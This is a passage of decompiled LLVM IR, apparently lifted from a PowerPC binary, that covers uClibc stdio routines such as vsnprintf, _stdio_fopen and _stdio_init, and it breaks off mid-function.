  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_10008138 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10008138, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10008188 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10008188, i32* %stack_var_-96, align 4
  store i32 268468628, i32* @lr, align 4
  %v0_10008190 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10008190
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_100081b0 = load i32, i32* @r4, align 4
  store i32 %v0_100081b0, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_100081cc = load i32, i32* @r3, align 4
  %v1_100081cc = sub i32 -1, %v0_100081cc
  store i32 %v1_100081cc, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_100081cc, i32* %r31.global-to-local, align 4
  %v2_100081e0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100081e0, i32* @r3, align 4
  %v0_100081e4 = load i32, i32* @r5, align 4
  store i32 %v0_100081e4, i32* %r29.global-to-local, align 4
  %v0_100081e8 = load i32, i32* @r6, align 4
  store i32 %v0_100081e8, i32* @r28, align 4
  store i32 268468728, i32* @lr, align 4
  %v0_100081f4 = call i32 @__stdio_init_mutex()
  %v0_100081f8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100081f8 = load i32, i32* @r27, align 4
  %v3_100081f8 = icmp ugt i32 %v0_100081f8, %v1_100081f8
  %v0_100081fc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100081fc, i32* @r4, align 4
  %v0_10008200 = load i32, i32* @r28, align 4
  store i32 %v0_10008200, i32* @r5, align 4
  %v2_10008204 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10008204, i32* @r3, align 4
  br i1 %v3_100081f8, label %dec_label_pc_10008210, label %dec_label_pc_10008214

dec_label_pc_10008210:                            ; preds = %entry
  store i32 %v1_100081f8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008214

dec_label_pc_10008214:                            ; preds = %entry, %dec_label_pc_10008210
  %v1_10008214 = phi i32 [ %v0_100081f8, %entry ], [ %v1_100081f8, %dec_label_pc_10008210 ]
  %v0_10008214 = load i32, i32* %r31.global-to-local, align 4
  store i32 268468788, i32* @lr, align 4
  %v0_10008230 = call i32 @_vfprintf_internal()
  %v0_10008234 = load i32, i32* @r30, align 4
  %v3_10008234 = icmp eq i32 %v0_10008234, 0
  br i1 %v3_10008234, label %dec_label_pc_1000825c, label %dec_label_pc_1000823c

dec_label_pc_1000823c:                            ; preds = %dec_label_pc_10008214
  %v4_10008248 = icmp eq i32 %v1_10008214, 0
  %v1_10008244 = sext i1 %v4_10008248 to i32
  %v0_10008250.v0_10008214 = add i32 %v0_10008214, %v1_10008244
  %stack_var_-88.0 = inttoptr i32 %v0_10008250.v0_10008214 to i8*
  %v0_10008258 = load i32, i32* @r26, align 4
  %v1_10008258 = trunc i32 %v0_10008258 to i8
  store i8 %v1_10008258, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000825c

dec_label_pc_1000825c:                            ; preds = %dec_label_pc_10008214, %dec_label_pc_1000823c
  ret i32 %v0_10008230

; uselistorder directives
  uselistorder i32 %v0_100081cc, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_1000825c, { 1, 0 }
  uselistorder label %dec_label_pc_10008214, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10008270 = load i32, i32* @lr, align 4
  store i32 %v0_10008270, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10008284 = load i32, i32* @r5, align 4
  store i32 %v0_10008284, i32* @r31, align 4
  %v0_10008288 = load i32, i32* @r6, align 4
  store i32 %v0_10008288, i32* @r29, align 4
  %v3_1000828c = load i8, i8* %arg2, align 1
  %v4_1000828c = zext i8 %v3_1000828c to i32
  store i32 %v4_1000828c, i32* %r0.global-to-local, align 4
  %v3_10008290 = icmp eq i8 %v3_1000828c, 114
  br i1 %v3_10008290, label %dec_label_pc_100082dc, label %dec_label_pc_10008298

dec_label_pc_10008298:                            ; preds = %entry
  %v3_10008298 = icmp eq i8 %v3_1000828c, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10008298, label %dec_label_pc_100082e0, label %dec_label_pc_100082a4

dec_label_pc_100082a4:                            ; preds = %dec_label_pc_10008298
  %v3_100082a4 = icmp eq i8 %v3_1000828c, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_100082a4, label %dec_label_pc_100082e0, label %dec_label_pc_100082b0

dec_label_pc_100082b0:                            ; preds = %dec_label_pc_10008370, %dec_label_pc_10008340, %dec_label_pc_100082a4
  %v0_100082b0 = call i32 @__errno_location()
  %v0_100082b4 = load i32, i32* @r31, align 4
  %v3_100082b4 = icmp eq i32 %v0_100082b4, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_100082bc = inttoptr i32 %v0_100082b0 to i32*
  store i32 22, i32* %v2_100082bc, align 4
  br i1 %v3_100082b4, label %dec_label_pc_10008510, label %dec_label_pc_100082c4

dec_label_pc_100082c4:                            ; preds = %dec_label_pc_100083a4, %dec_label_pc_100082b0
  %v0_100082c4 = load i32, i32* @r31, align 4
  %v1_100082c4 = inttoptr i32 %v0_100082c4 to i16*
  %v2_100082c4 = load i16, i16* %v1_100082c4, align 2
  %v3_100082c4 = zext i16 %v2_100082c4 to i32
  store i32 %v3_100082c4, i32* %r0.global-to-local, align 4
  %v1_100082c8 = and i32 %v3_100082c4, 8192
  store i32 %v1_100082c8, i32* %r9.global-to-local, align 4
  %v3_100082c8 = icmp eq i32 %v1_100082c8, 0
  store i1 %v3_100082c8, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_100082c8, label %dec_label_pc_10008510, label %dec_label_pc_100082d0

dec_label_pc_100082d0:                            ; preds = %dec_label_pc_100082c4
  store i32 %v0_100082c4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100082d8.567 to i32), i32* @lr, align 4
  %v0_100082d4 = call i32 @free()
  br label %dec_label_pc_10008510

dec_label_pc_100082dc:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100082e0

dec_label_pc_100082e0:                            ; preds = %dec_label_pc_100082a4, %dec_label_pc_10008298, %dec_label_pc_100082dc
  %v0_10008300 = phi i32 [ 1089, %dec_label_pc_100082a4 ], [ 577, %dec_label_pc_10008298 ], [ 1, %dec_label_pc_100082dc ]
  %v2_100082e0 = add i32 %tmp, 1
  %v3_100082e0 = inttoptr i32 %v2_100082e0 to i8*
  %v4_100082e0 = load i8, i8* %v3_100082e0, align 1
  %v5_100082e0 = zext i8 %v4_100082e0 to i32
  store i32 %v5_100082e0, i32* %r0.global-to-local, align 4
  %v3_100082e8 = icmp eq i8 %v4_100082e0, 98
  br i1 %v3_100082e8, label %dec_label_pc_100082f4, label %dec_label_pc_100082f0

dec_label_pc_100082f0:                            ; preds = %dec_label_pc_100082e0
  br label %dec_label_pc_100082f4

dec_label_pc_100082f4:                            ; preds = %dec_label_pc_100082e0, %dec_label_pc_100082f0
  %storemerge = phi i32 [ %tmp, %dec_label_pc_100082f0 ], [ %v2_100082e0, %dec_label_pc_100082e0 ]
  %v0_100082f4 = phi i32 [ %tmp, %dec_label_pc_100082f0 ], [ %v2_100082e0, %dec_label_pc_100082e0 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100082f4 = add i32 %v0_100082f4, 1
  %v2_100082f4 = inttoptr i32 %v1_100082f4 to i8*
  %v3_100082f4 = load i8, i8* %v2_100082f4, align 1
  %v4_100082f4 = zext i8 %v3_100082f4 to i32
  store i32 %v4_100082f4, i32* %r0.global-to-local, align 4
  %v3_100082f8 = icmp eq i8 %v3_100082f4, 43
  br i1 %v3_100082f8, label %dec_label_pc_10008300, label %dec_label_pc_10008308

dec_label_pc_10008300:                            ; preds = %dec_label_pc_100082f4
  store i32 %v0_10008300, i32* %r9.global-to-local, align 4
  %v1_10008304 = add nuw nsw i32 %v0_10008300, 1
  store i32 %v1_10008304, i32* @r28, align 4
  br label %dec_label_pc_10008308

dec_label_pc_10008308:                            ; preds = %dec_label_pc_100082f4, %dec_label_pc_10008300
  %v3_10008308 = icmp eq i32 %v0_10008284, 0
  br i1 %v3_10008308, label %dec_label_pc_10008310, label %dec_label_pc_10008338

dec_label_pc_10008310:                            ; preds = %dec_label_pc_10008308
  store i32 80, i32* @r3, align 4
  store i32 268469016, i32* @lr, align 4
  %v0_10008314 = call i32 @malloc()
  store i32 %v0_10008314, i32* @r31, align 4
  %v4_10008318 = icmp eq i32 %v0_10008314, 0
  store i1 %v4_10008318, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_10008318, label %dec_label_pc_10008514, label %dec_label_pc_10008320

dec_label_pc_10008320:                            ; preds = %dec_label_pc_10008310
  %v1_10008324 = add i32 %v0_10008314, 56
  store i32 %v1_10008324, i32* @r3, align 4
  %v3_10008328 = inttoptr i32 %v0_10008314 to i16*
  store i16 8192, i16* %v3_10008328, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10008330 = load i32, i32* @r31, align 4
  %v2_10008330 = add i32 %v1_10008330, 8
  %v3_10008330 = inttoptr i32 %v2_10008330 to i32*
  store i32 0, i32* %v3_10008330, align 4
  store i32 268469048, i32* @lr, align 4
  %v0_10008334 = call i32 @__stdio_init_mutex()
  %v0_10008338.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10008338

dec_label_pc_10008338:                            ; preds = %dec_label_pc_10008308, %dec_label_pc_10008320
  %v0_10008398 = phi i32 [ %v0_10008288, %dec_label_pc_10008308 ], [ %v0_10008338.pre, %dec_label_pc_10008320 ]
  %v1_10008338 = icmp slt i32 %v0_10008398, 0
  br i1 %v1_10008338, label %dec_label_pc_10008398, label %dec_label_pc_10008340

dec_label_pc_10008340:                            ; preds = %dec_label_pc_10008338
  %v1_10008344 = add i32 %arg1, 1
  store i32 %v1_10008344, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_1000834c = load i32, i32* @r31, align 4
  %v2_1000834c = add i32 %v1_1000834c, 4
  %v3_1000834c = inttoptr i32 %v2_1000834c to i32*
  store i32 %v0_10008398, i32* %v3_1000834c, align 4
  %v0_10008350 = load i32, i32* @r28, align 4
  %v1_10008350 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008350 = and i32 %v1_10008350, %v0_10008350
  %v1_10008354 = add i32 %v2_10008350, 1
  store i32 %v1_10008354, i32* %r9.global-to-local, align 4
  %v1_10008358 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008358 = and i32 %v1_10008358, %v1_10008354
  store i32 %v2_10008358, i32* %r0.global-to-local, align 4
  %v4_1000835c = icmp eq i32 %v2_10008358, %v1_10008354
  br i1 %v4_1000835c, label %dec_label_pc_10008364, label %dec_label_pc_100082b0

dec_label_pc_10008364:                            ; preds = %dec_label_pc_10008340
  %v2_10008364 = sub i32 -1, %arg1
  %v3_10008364 = and i32 %v0_10008350, %v2_10008364
  store i32 %v3_10008364, i32* %r0.global-to-local, align 4
  %v1_10008368 = and i32 %v3_10008364, 1024
  store i32 %v1_10008368, i32* %r9.global-to-local, align 4
  %v3_10008368 = icmp eq i32 %v1_10008368, 0
  store i1 %v3_10008368, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10008368, label %dec_label_pc_1000838c, label %dec_label_pc_10008370

dec_label_pc_10008370:                            ; preds = %dec_label_pc_10008364
  %v0_10008370 = load i32, i32* @r29, align 4
  store i32 268469124, i32* @lr, align 4
  %v2_10008380 = call i32 @__libc_fcntl(i32 %v0_10008370, i32 4)
  %v3_10008384 = icmp eq i32 %v2_10008380, 0
  br i1 %v3_10008384, label %dec_label_pc_1000838c, label %dec_label_pc_100082b0

dec_label_pc_1000838c:                            ; preds = %dec_label_pc_10008370, %dec_label_pc_10008364
  %v1_1000838c = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_1000838c, i32* %r0.global-to-local, align 4
  %v0_10008390 = load i32, i32* @r28, align 4
  %v2_10008390 = or i32 %v0_10008390, %v1_1000838c
  store i32 %v2_10008390, i32* @r28, align 4
  br label %dec_label_pc_100083c4

dec_label_pc_10008398:                            ; preds = %dec_label_pc_10008338
  %v3_10008398 = icmp eq i32 %v0_10008398, -1
  %v0_100083a8.pre = load i32, i32* @r28, align 4
  br i1 %v3_10008398, label %dec_label_pc_100083a4, label %dec_label_pc_100083a0

dec_label_pc_100083a0:                            ; preds = %dec_label_pc_10008398
  %v1_100083a0 = or i32 %v0_100083a8.pre, 65536
  store i32 %v1_100083a0, i32* @r28, align 4
  br label %dec_label_pc_100083a4

dec_label_pc_100083a4:                            ; preds = %dec_label_pc_10008398, %dec_label_pc_100083a0
  %v0_100083a8 = phi i32 [ %v1_100083a0, %dec_label_pc_100083a0 ], [ %v0_100083a8.pre, %dec_label_pc_10008398 ]
  store i32 438, i32* @r5, align 4
  store i32 268469176, i32* @lr, align 4
  %v2_100083b4 = call i32 @__libc_open(i32 %arg1, i32 %v0_100083a8)
  %v1_100083b8 = icmp slt i32 %v2_100083b4, 0
  %v1_100083bc = load i32, i32* @r31, align 4
  %v2_100083bc = add i32 %v1_100083bc, 4
  %v3_100083bc = inttoptr i32 %v2_100083bc to i32*
  store i32 %v2_100083b4, i32* %v3_100083bc, align 4
  br i1 %v1_100083b8, label %dec_label_pc_100082c4, label %dec_label_pc_100083a4.dec_label_pc_100083c4_crit_edge

dec_label_pc_100083a4.dec_label_pc_100083c4_crit_edge: ; preds = %dec_label_pc_100083a4
  %v0_100083c8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100083c4

dec_label_pc_100083c4:                            ; preds = %dec_label_pc_100083a4.dec_label_pc_100083c4_crit_edge, %dec_label_pc_1000838c
  %v0_100083c8 = phi i32 [ %v0_100083c8.pre, %dec_label_pc_100083a4.dec_label_pc_100083c4_crit_edge ], [ %v2_10008390, %dec_label_pc_1000838c ]
  %v0_100083c4 = load i32, i32* @r31, align 4
  %v1_100083c4 = inttoptr i32 %v0_100083c4 to i16*
  %v2_100083c4 = load i16, i16* %v1_100083c4, align 2
  %v3_100083c4 = zext i16 %v2_100083c4 to i32
  store i32 %v3_100083c4, i32* %r0.global-to-local, align 4
  %v1_100083c8 = urem i32 %v0_100083c8, 4
  store i32 %v1_100083c8, i32* %r29.global-to-local, align 4
  %v1_100083cc = call i32 @__asm_rlwinm(i32 %v0_100083c8, i32 0, i32 21, i32 21)
  %v1_100083d0 = add nuw nsw i32 %v1_100083c8, 1
  store i32 %v1_100083d0, i32* %r29.global-to-local, align 4
  %v1_100083d4 = call i32 @__asm_rlwinm(i32 %v3_100083c4, i32 0, i32 18, i32 18)
  store i32 %v1_100083d4, i32* %r0.global-to-local, align 4
  %v1_100083d8 = xor i32 %v1_100083d0, 3
  store i32 %v1_100083d8, i32* %r29.global-to-local, align 4
  %v1_100083dc = urem i32 %v1_100083d4, 65536
  store i32 %v1_100083dc, i32* %r9.global-to-local, align 4
  %v0_100083e0 = load i32, i32* @r28, align 4
  %v1_100083e0 = call i32 @__asm_rlwinm(i32 %v0_100083e0, i32 31, i32 16, i32 16)
  %v2_100083e4 = or i32 %v1_100083e0, %v1_100083cc
  store i32 %v2_100083e4, i32* %r0.global-to-local, align 4
  %v0_100083e8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100083e8 = mul i32 %v0_100083e8, 16
  %v0_100083ec = load i32, i32* %r9.global-to-local, align 4
  %v2_100083ec = or i32 %v0_100083ec, %v2_100083e4
  store i32 %v2_100083ec, i32* %r9.global-to-local, align 4
  %v2_100083f0 = or i32 %v2_100083ec, %v1_100083e8
  store i32 %v2_100083f0, i32* @r29, align 4
  %v1_100083f4 = trunc i32 %v2_100083f0 to i16
  %v2_100083f4 = load i32, i32* @r31, align 4
  %v3_100083f4 = inttoptr i32 %v2_100083f4 to i16*
  store i16 %v1_100083f4, i16* %v3_100083f4, align 2
  %v0_100083f8 = call i32 @__errno_location()
  store i32 %v0_100083f8, i32* @r28, align 4
  %v0_10008400 = load i32, i32* @r31, align 4
  %v1_10008400 = add i32 %v0_10008400, 4
  %v2_10008400 = inttoptr i32 %v1_10008400 to i32*
  %v3_10008400 = load i32, i32* %v2_10008400, align 4
  %v1_10008404 = inttoptr i32 %v0_100083f8 to i32*
  %v2_10008404 = load i32, i32* %v1_10008404, align 4
  store i32 %v2_10008404, i32* @r27, align 4
  store i32 268469260, i32* @lr, align 4
  %v1_10008408 = call i32 @isatty(i32 %v3_10008400)
  %v1_1000840c = mul i32 %v1_10008408, 256
  %v0_10008410 = load i32, i32* @r29, align 4
  %v2_10008410 = or i32 %v0_10008410, %v1_1000840c
  store i32 %v2_10008410, i32* @r29, align 4
  %v1_10008414 = trunc i32 %v2_10008410 to i16
  %v2_10008414 = load i32, i32* @r31, align 4
  %v3_10008414 = inttoptr i32 %v2_10008414 to i16*
  store i16 %v1_10008414, i16* %v3_10008414, align 2
  %v0_10008418 = load i32, i32* @r27, align 4
  %v1_10008418 = load i32, i32* @r28, align 4
  %v2_10008418 = inttoptr i32 %v1_10008418 to i32*
  store i32 %v0_10008418, i32* %v2_10008418, align 4
  %v0_1000841c = load i32, i32* @r31, align 4
  %v1_1000841c = add i32 %v0_1000841c, 8
  %v2_1000841c = inttoptr i32 %v1_1000841c to i32*
  %v3_1000841c = load i32, i32* %v2_1000841c, align 4
  store i32 %v3_1000841c, i32* %r0.global-to-local, align 4
  %v3_10008420 = icmp eq i32 %v3_1000841c, 0
  br i1 %v3_10008420, label %dec_label_pc_10008428, label %dec_label_pc_10008458

dec_label_pc_10008428:                            ; preds = %dec_label_pc_100083c4
  store i32 4096, i32* @r3, align 4
  store i32 268469296, i32* @lr, align 4
  %v0_1000842c = call i32 @malloc()
  %v3_10008430 = icmp eq i32 %v0_1000842c, 0
  %v1_10008434 = load i32, i32* @r31, align 4
  %v2_10008434 = add i32 %v1_10008434, 8
  %v3_10008434 = inttoptr i32 %v2_10008434 to i32*
  store i32 %v0_1000842c, i32* %v3_10008434, align 4
  %v1_10008454 = load i32, i32* @r31, align 4
  br i1 %v3_10008430, label %dec_label_pc_10008454, label %dec_label_pc_1000843c

dec_label_pc_1000843c:                            ; preds = %dec_label_pc_10008428
  %v1_1000843c = inttoptr i32 %v1_10008454 to i16*
  %v2_1000843c = load i16, i16* %v1_1000843c, align 2
  %v3_1000843c = zext i16 %v2_1000843c to i32
  store i32 %v3_1000843c, i32* %r0.global-to-local, align 4
  %v1_10008440 = add i32 %v0_1000842c, 4096
  store i32 %v1_10008440, i32* %r9.global-to-local, align 4
  %v2_10008444 = add i32 %v1_10008454, 12
  %v3_10008444 = inttoptr i32 %v2_10008444 to i32*
  store i32 %v1_10008440, i32* %v3_10008444, align 4
  %v0_10008448 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008448 = or i32 %v0_10008448, 16384
  store i32 %v1_10008448, i32* %r0.global-to-local, align 4
  %v1_1000844c = trunc i32 %v1_10008448 to i16
  %v2_1000844c = load i32, i32* @r31, align 4
  %v3_1000844c = inttoptr i32 %v2_1000844c to i16*
  store i16 %v1_1000844c, i16* %v3_1000844c, align 2
  br label %dec_label_pc_10008458

dec_label_pc_10008454:                            ; preds = %dec_label_pc_10008428
  %v2_10008454 = add i32 %v1_10008454, 12
  %v3_10008454 = inttoptr i32 %v2_10008454 to i32*
  store i32 0, i32* %v3_10008454, align 4
  br label %dec_label_pc_10008458

dec_label_pc_10008458:                            ; preds = %dec_label_pc_100083c4, %dec_label_pc_1000843c, %dec_label_pc_10008454
  %v0_10008458 = load i32, i32* @r31, align 4
  %v1_10008458 = inttoptr i32 %v0_10008458 to i16*
  %v2_10008458 = load i16, i16* %v1_10008458, align 2
  %v3_10008458 = zext i16 %v2_10008458 to i32
  store i32 %v3_10008458, i32* %r0.global-to-local, align 4
  %v1_1000845c = add i32 %v0_10008458, 8
  %v2_1000845c = inttoptr i32 %v1_1000845c to i32*
  %v3_1000845c = load i32, i32* %v2_1000845c, align 4
  store i32 %v3_1000845c, i32* %r9.global-to-local, align 4
  %v1_10008460 = and i32 %v3_10008458, 8192
  %v3_10008460 = icmp eq i32 %v1_10008460, 0
  store i1 %v3_10008460, i1* %cr0_eq.global-to-local, align 1
  %v3_10008468 = add i32 %v0_10008458, 2
  %v4_10008468 = inttoptr i32 %v3_10008468 to i8*
  store i8 0, i8* %v4_10008468, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10008470 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008470 = load i32, i32* @r31, align 4
  %v2_10008470 = add i32 %v1_10008470, 20
  %v3_10008470 = inttoptr i32 %v2_10008470 to i32*
  store i32 %v0_10008470, i32* %v3_10008470, align 4
  %v0_10008474 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008474 = load i32, i32* @r31, align 4
  %v2_10008474 = add i32 %v1_10008474, 24
  %v3_10008474 = inttoptr i32 %v2_10008474 to i32*
  store i32 %v0_10008474, i32* %v3_10008474, align 4
  %v0_10008478 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008478 = load i32, i32* @r31, align 4
  %v2_10008478 = add i32 %v1_10008478, 28
  %v3_10008478 = inttoptr i32 %v2_10008478 to i32*
  store i32 %v0_10008478, i32* %v3_10008478, align 4
  %v0_1000847c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000847c = load i32, i32* @r31, align 4
  %v2_1000847c = add i32 %v1_1000847c, 16
  %v3_1000847c = inttoptr i32 %v2_1000847c to i32*
  store i32 %v0_1000847c, i32* %v3_1000847c, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_10008484 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008484 = load i32, i32* @r31, align 4
  %v2_10008484 = add i32 %v1_10008484, 44
  %v3_10008484 = inttoptr i32 %v2_10008484 to i32*
  store i32 %v0_10008484, i32* %v3_10008484, align 4
  %v3_10008488 = load i32, i32* @global_var_10024a14.568, align 4
  store i32 %v3_10008488, i32* %r0.global-to-local, align 4
  %v1_1000848c = load i32, i32* @r31, align 4
  %v2_1000848c = add i32 %v1_1000848c, 52
  %v3_1000848c = inttoptr i32 %v2_1000848c to i32*
  store i32 %v3_10008488, i32* %v3_1000848c, align 4
  %v0_10008490 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10008490, label %dec_label_pc_10008514, label %dec_label_pc_10008494

dec_label_pc_10008494:                            ; preds = %dec_label_pc_10008458
  store i32 ptrtoint ([3 x i8]* @global_var_1000c114.562 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100246cc.563 to i32), i32* %r29.global-to-local, align 4
  %v2_100084a4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100084a4, i32* @r26, align 4
  store i32 %v2_100084a4, i32* @r3, align 4
  %v0_100084b4 = call i32 @__pthread_return_void()
  %v2_100084c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100084c0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_100246b4.569 to i32), i32* @r29, align 4
  %v0_100084c8 = call i32 @__pthread_return_0()
  store i32 %v2_100084c0, i32* @r3, align 4
  %v0_100084d8 = call i32 @__pthread_return_void()
  %v0_100084e0 = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100084e8 = load i32, i32* bitcast (i32** @global_var_10024a10.570 to i32*), align 4
  store i32 %v3_100084e8, i32* %r0.global-to-local, align 4
  store i32 %v2_100084c0, i32* @r3, align 4
  %v1_100084f4 = load i32, i32* @r31, align 4
  %v2_100084f4 = add i32 %v1_100084f4, 32
  %v3_100084f4 = inttoptr i32 %v2_100084f4 to i32*
  store i32 %v3_100084e8, i32* %v3_100084f4, align 4
  %v0_100084f8 = load i32, i32* @r31, align 4
  store i32 %v0_100084f8, i32* bitcast (i32** @global_var_10024a10.570 to i32*), align 4
  %v0_100084fc = call i32 @__pthread_return_void()
  store i32 %v2_100084a4, i32* @r3, align 4
  %v0_10008508 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10008514

dec_label_pc_10008510:                            ; preds = %dec_label_pc_100082c4, %dec_label_pc_100082b0, %dec_label_pc_100082d0
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10008514

dec_label_pc_10008514:                            ; preds = %dec_label_pc_10008458, %dec_label_pc_10008310, %dec_label_pc_10008494, %dec_label_pc_10008510
  store i32 %v0_10008270, i32* %r0.global-to-local, align 4
  %v0_10008518 = load i32, i32* @r31, align 4
  ret i32 %v0_10008518

; uselistorder directives
  uselistorder i32 %v1_10008454, { 2, 0, 1 }
  uselistorder i32 %v0_100083c8, { 1, 0 }
  uselistorder i32 %v0_10008314, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10008300, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 4, 0, 1, 2, 3 }
  uselistorder i32 21, { 1, 2, 0, 3 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_10008514, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10008510, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008458, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100083a4, { 1, 0 }
  uselistorder label %dec_label_pc_10008338, { 1, 0 }
  uselistorder label %dec_label_pc_10008308, { 1, 0 }
  uselistorder label %dec_label_pc_100082f4, { 1, 0 }
  uselistorder label %dec_label_pc_100082e0, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268566528, i32* @r28, align 4
  %v0_10008540 = call i32 @__errno_location()
  store i32 %v0_10008540, i32* @r26, align 4
  %v1_1000854c = inttoptr i32 %v0_10008540 to i32*
  %v2_1000854c = load i32, i32* %v1_1000854c, align 4
  store i32 %v2_1000854c, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_100246e4.558 to i32), i32* @r27, align 4
  %v3_10008554 = load i16, i16* @global_var_100246e4.558, align 2
  %v4_10008554 = zext i16 %v3_10008554 to i32
  store i32 %v4_10008554, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000855c.572 to i32), i32* @lr, align 4
  %v1_10008558 = call i32 @isatty(i32 0)
  %v1_1000855c = sub i32 1, %v1_10008558
  %v1_10008560 = mul i32 %v1_1000855c, 256
  %v0_10008564 = load i32, i32* @r29, align 4
  %v2_10008564 = xor i32 %v1_10008560, %v0_10008564
  %v1_1000856c = trunc i32 %v2_10008564 to i16
  store i16 %v1_1000856c, i16* @global_var_100246e4.558, align 2
  %v3_10008570 = load i16, i16* @global_var_10024734.559, align 2
  %v4_10008570 = zext i16 %v3_10008570 to i32
  store i32 %v4_10008570, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008578.573 to i32), i32* @lr, align 4
  %v1_10008574 = call i32 @isatty(i32 1)
  %v1_10008578 = sub i32 1, %v1_10008574
  %v1_1000857c = mul i32 %v1_10008578, 256
  %v0_10008580 = load i32, i32* @r29, align 4
  %v2_10008580 = xor i32 %v1_1000857c, %v0_10008580
  %v1_10008584 = trunc i32 %v2_10008580 to i16
  store i16 %v1_10008584, i16* @global_var_10024734.559, align 2
  %v0_10008588 = load i32, i32* @r25, align 4
  %v1_10008588 = load i32, i32* @r26, align 4
  %v2_10008588 = inttoptr i32 %v1_10008588 to i32*
  store i32 %v0_10008588, i32* %v2_10008588, align 4
  ret i32 %v1_1000857c

; uselistorder directives
  uselistorder i32 %v1_1000857c, { 1, 0 }
  uselistorder i16* @global_var_10024734.559, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10012908.574 to i32), i32* @r4, align 4
  %v0_100085ac = call i32 @memcpy()
  ret i32 %v0_100085ac
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100246b4.569 to i32), i32* @r3, align 4
  store i32 268469708, i32* @lr, align 4
  %v0_100085c8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_100246cc.563 to i32), i32* @r3, align 4
  store i32 268469720, i32* @lr, align 4
  %v0_100085d4 = call i32 @__stdio_init_mutex()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10024a10.570 to i32*), align 4
